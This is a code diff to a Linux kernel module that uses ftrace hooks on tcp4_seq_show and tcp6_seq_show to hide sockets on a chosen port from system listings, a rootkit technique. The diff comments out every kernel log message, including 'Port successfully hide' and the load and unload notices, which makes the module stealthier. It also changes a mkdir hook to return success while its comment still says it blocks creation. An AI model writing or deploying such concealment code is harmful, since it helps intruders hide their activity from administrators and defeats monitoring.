@@ -153,7 +153,7 @@ static asmlinkage long  hook_tcp4_seq_show(struct seq_file *seq,void *v){
     struct sock *sk = v;
     if (sk !=(struct sock *)0x1 && sk->sk_num == PORT_HIDING)
     {
-        pr_info("Port successfully hide\n");
+       // pr_info("Port successfully hide\n");
         return 0;
     }
     ret=tcp4(seq,v);
@@ -165,7 +165,7 @@ static asmlinkage long  hook_tcp6_seq_show(struct seq_file *seq,void *v){
     struct sock *sk = v;
     if (sk !=(struct sock *)0x1 && sk->sk_num == PORT_HIDING)
     {
-        pr_info("Port successfully hide\n");
+       // pr_info("Port successfully hide\n");
         return 0;
     }
     ret=tcp6(seq,v);
@@ -183,9 +183,9 @@ static asmlinkage long hook_mkdir(const struct pt_regs *regs)
     char path[256];
     
     if (strncpy_from_user(path, pathname, sizeof(path)) > 0) {
-        pr_info("Directory creation blocked: %s\n", path);
+       // pr_info("Directory creation blocked: %s\n", path);
     }
-    return -EACCES; // Prevents the directory creation
+    return 0; // Prevents the directory creation
 }
 #endif
 static struct ftrace_hook hooks[] = {
@@ -229,18 +229,18 @@ static int __init mkdir_monitor_init(void)
             goto error;
     }
 #if (TCP_HOOK_IS_ENABLED > 0 && MKDIR_HOOK_IS_ENABLED > 0) 
-    pr_info("PORT_HIDE: Loaded\n");
-    pr_info("mkdir_monitor: Loaded\n");
+   // pr_info("PORT_HIDE: Loaded\n");
+  //  pr_info("mkdir_monitor: Loaded\n");
     return 0;
 #endif    
 
 #if(TCP_HOOK_IS_ENABLED > 0)     
-    pr_info("PORT_HIDE: Loaded\n");
+   // pr_info("PORT_HIDE: Loaded\n");
     return 0;
 #endif
  
 #if(MKDIR_HOOK_IS_ENABLED > 0)
-    pr_info("mkdir_monitor: Loaded\n");
+   // pr_info("mkdir_monitor: Loaded\n");
     return 0;
 #endif    
 
@@ -258,16 +258,16 @@ static void __exit mkdir_monitor_exit(void)
     for (i = 0; i < ARRAY_SIZE(hooks); i++)
         fh_remove_hook(&hooks[i]);
 #if (TCP_HOOK_IS_ENABLED>0 && MKDIR_HOOK_IS_ENABLED > 0)
-    pr_info("mkdir_monitor: Unloaded\n");
-    pr_info("PORT_HIDE: Unloaded\n");     
+  //  pr_info("mkdir_monitor: Unloaded\n");
+  //  pr_info("PORT_HIDE: Unloaded\n");     
 #endif
  
 #if (TCP_HOOK_IS_ENABLED>0 && !(MKDIR_HOOK_IS_ENABLED>0))
-    pr_info("PORT_HIDE: Unloaded\n");
+  //  pr_info("PORT_HIDE: Unloaded\n");
 #endif
  
 #if (MKDIR_HOOK_IS_ENABLED >0 && !(TCP_HOOK_IS_ENABLED))
-    pr_info("mkdir_monitor: Unloaded\n");
+  //  pr_info("mkdir_monitor: Unloaded\n");
 #endif
 }
 
